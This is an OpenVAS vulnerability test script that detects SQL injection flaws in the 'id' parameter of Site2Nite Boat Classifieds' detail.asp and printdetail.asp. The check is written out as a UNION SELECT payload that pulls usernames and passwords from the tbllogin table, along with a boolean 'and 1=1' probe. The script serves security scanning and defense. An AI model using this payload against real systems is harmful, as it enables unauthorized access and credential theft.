###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_site2nite_boat_classifieds_sql_injection_vuln.nasl 14233 2019-03-16 13:32:43Z mmartin $
#
# Site2Nite Boat Classifieds Multiple SQL Injection Vulnerabilities
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801378");
  script_version("$Revision: 14233 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-16 14:32:43 +0100 (Sat, 16 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-07-16 19:44:55 +0200 (Fri, 16 Jul 2010)");
  script_cve_id("CVE-2010-2687", "CVE-2010-2688");
  script_bugtraq_id(41046, 41059);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Site2Nite Boat Classifieds Multiple SQL Injection Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/13990/");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/13995/");
  script_xref(name:"URL", value:"http://www.vupen.com/english/advisories/2010/1576");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to gain unauthorized
  access and obtain sensitive information.");

  script_tag(name:"affected", value:"Site2Nite Boat Classifieds");

  script_tag(name:"insight", value:"The flaws are caused by improper validation of user-supplied
  input via the 'id' parameter in 'detail.asp' and 'printdetail.asp' that allows
  attackers to manipulate SQL queries by injecting arbitrary SQL code.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The host is running Site2Nite Boat Classifieds and is prone to
  SQL injection vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );
if( ! can_host_asp( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/boat-webdesign", "/products/boat-webdesign/www", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  url = string( dir,'/detail.asp?ID=999999 union select1,2,3,' +
                    '4,5,username,password,8,9,10,11,12,13,14,15,16,17,18,19,20,' +
                    '21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,' +
                    '41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,' +
                    '61,62,63,64,65,66,67,68,69,70,71,72,73,74from tbllogin "' +
                    'having 1=1--"' );
  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port,data:req );

  if( res !~ "HTTP/1\.. 200" ) continue;

  if(('/boat-webdesign/' >< res) && (("DELETE" >< res) ||("SELECT" >< res))) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }

  url = string(dir,'/printdetail.asp?Id=661 and 1=1');

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port,data:req, bodyonly:FALSE );

  if( res !~ "HTTP/1\.. 200" ) exit( 99 );

  if(('>BOAT DETAILS - Site Id' >< res) && (">Seller Information:<" >< res)) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
